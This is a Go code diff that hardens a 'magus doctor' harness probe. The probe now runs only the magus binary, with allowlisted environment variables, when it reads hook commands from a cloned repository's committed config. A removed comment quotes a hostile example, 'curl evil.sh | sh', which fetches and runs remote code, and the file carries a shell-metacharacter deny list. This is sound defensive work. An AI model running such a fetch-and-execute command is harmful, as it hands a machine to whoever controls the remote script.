@@ -73,14 +73,14 @@ const (
 // verdict worth probing. A lifecycle script (observe, checkpoint, rehydrate) never
 // renders one (see their own doc comments), so presence is all there is to check
 // for those, and the exact-entry match VerifyHarness already ran is that check.
-func probeable(command string) bool {
+func probeable(root, command string) bool {
 	switch {
 	case namesTemplate(command, "magus-observe"),
 		namesTemplate(command, "magus-checkpoint"),
 		namesTemplate(command, "magus-rehydrate"):
 		return false
 	default:
-		return invokesMagus(command) && runnableAsProbe(command)
+		return runnableAsProbe(root, command)
 	}
 }
 
@@ -95,38 +95,66 @@ const probeMetacharacters = ";&|<>()$`\n\r\\\"'{}*?[]~!#"
 
 // runnableAsProbe reports whether command is safe for this probe to EXECUTE.
 //
-// invokesMagus is not that question and must not be used as though it were. It asks
-// whether a config invokes magus at all, for coverage reporting, and it answers with
-// substring tests: `strings.Contains(command, "magus-command")` is true of
-// `curl evil.sh | sh; magus buzz -s magus-command.buzz`, which is one string containing a shipped
-// basename and one command line doing something else entirely.
-//
-// That distinction is load-bearing because of WHERE the command comes from. A descriptor
-// names a workspace-relative config document (`.claude/settings.json` and its siblings),
-// so the commands are committed, and they arrive with a clone or a pull. VerifyHarness
-// runs non-interactively from `magus doctor` and from the improvement pass, so the
-// sequence is: clone a repository, run doctor, execute shell that repository chose.
-//
-// So the test is shape, not content: optional NAME=value assignments, then a program and
-// its arguments, and not one character that could start a second command, expand, or
-// redirect. Everything magus ships passes (`magus buzz -s docs/.../magus-command.buzz --
-// --agent-name <host>`), and nothing that composes commands does. A command this rejects
-// is still REPORTED by the coverage path; it is only never run.
-func runnableAsProbe(command string) bool {
+// The commands come from a committed hook config, so doctor would otherwise run what a
+// clone chose. invokesMagus is a coverage substring test and says nothing about the
+// program. Only the magus binary runs, with allowlisted assignments ahead of it; a
+// rejected command is still reported, never run.
+func runnableAsProbe(root, command string) bool {
 	if strings.ContainsAny(command, probeMetacharacters) {
 		return false
 	}
-	for _, field := range strings.Fields(command) {
-		// Leading assignments are how an entry run through a shell sets the glue's host
-		// knobs (HOST_EVENT_PATH and its siblings), so they are allowed until the first bare
-		// word, which is the program. Everything after it is an argument and already
-		// metacharacter-free.
-		if name, _, isAssignment := strings.Cut(field, "="); isAssignment && isEnvName(name) {
-			continue
+	fields := strings.Fields(command)
+	for len(fields) > 0 {
+		name, _, isAssignment := strings.Cut(fields[0], "=")
+		if !isAssignment || !isEnvName(name) {
+			break
 		}
-		return true // the program: reached only when nothing before it disqualified the line
+		if !slices.Contains(probeAssignments, name) {
+			return false
+		}
+		fields = fields[1:]
 	}
-	return false // assignments and nothing to run
+	if len(fields) < 2 || !isMagusProgram(root, fields[0]) {
+		return false
+	}
+	return slices.Contains(fields[1:], "buzz") || magusGuardInvocation.MatchString(strings.Join(fields, " "))
+}
+
+// probeAssignments are the host knobs the shipped glue reads. A loader variable such
+// as LD_PRELOAD or PATH is absent on purpose: it would redirect the program.
+var probeAssignments = []string{
+	"HOST_ADVISE_BRANCH", "HOST_AGENT_PATH", "HOST_ASK_BRANCH", "HOST_CWD_PATH",
+	"HOST_EVENT_PATH", "HOST_MESSAGE_PATH", "HOST_PROJECT_DIRS", "HOST_REPO_ROOT",
+	"HOST_RESPONSE", "HOST_SESSION_IDS", "HOST_SESSION_PATH", "HOST_SESSION_STORE",
+	"HOST_TOOL_PATH", "HOST_TRANSCRIPT_PATH", "CLAUDE_PROJECT_DIR",
+}
+
+// isMagusProgram reports whether sh would run the magus binary for word: bare `magus`
+// from PATH, the workspace's ./magus, or this executable. Any other path is refused,
+// even one named magus.
+func isMagusProgram(root, word string) bool {
+	if !strings.ContainsRune(word, filepath.Separator) {
+		return word == "magus" || word == "magus.exe"
+	}
+	if !filepath.IsAbs(word) {
+		word = filepath.Join(root, word)
+	}
+	got, err := os.Stat(word)
+	if err != nil {
+		return false
+	}
+	own := filepath.Join(root, "magus")
+	if runtime.GOOS == "windows" {
+		own += ".exe"
+	}
+	candidates := []string{own}
+	if self, err := os.Executable(); err == nil {
+		candidates = append(candidates, self)
+	}
+	return slices.ContainsFunc(candidates, func(candidate string) bool {
+		want, err := os.Stat(candidate)
+		return err == nil && os.SameFile(got, want)
+	})
 }
 
 // isEnvName reports whether s is shaped like an environment variable name.
@@ -187,7 +215,7 @@ func probeHarnessCommands(ctx context.Context, root string, config map[string]an
 	seen := make(map[string]bool, len(all))
 	var commands []string
 	for _, c := range all {
-		if seen[c] || !probeable(c) {
+		if seen[c] || !probeable(root, c) {
 			continue
 		}
 		seen[c] = true
